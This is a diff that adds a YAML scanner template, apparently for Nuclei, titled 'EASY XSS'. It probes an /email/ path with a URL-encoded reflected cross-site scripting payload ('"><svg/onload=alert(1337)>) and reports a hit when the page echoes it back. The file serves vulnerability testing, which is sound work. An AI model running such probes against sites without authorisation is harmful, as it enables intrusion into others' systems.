@@ -1,0 +1,21 @@
+id: easy-xss
+
+info:
+  name: EASY XSS
+  author: laomo
+  severity: medium
+  description: EASY XSS
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/email//%27%22%3E%3Csvg/onload=alert(1337)%3E'
+      - '{{BaseURL}}/email//?%27%22%3E%3Csvg/onload=alert(1337)%3E'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<svg/onload=alert(1337)>"
+        part: body
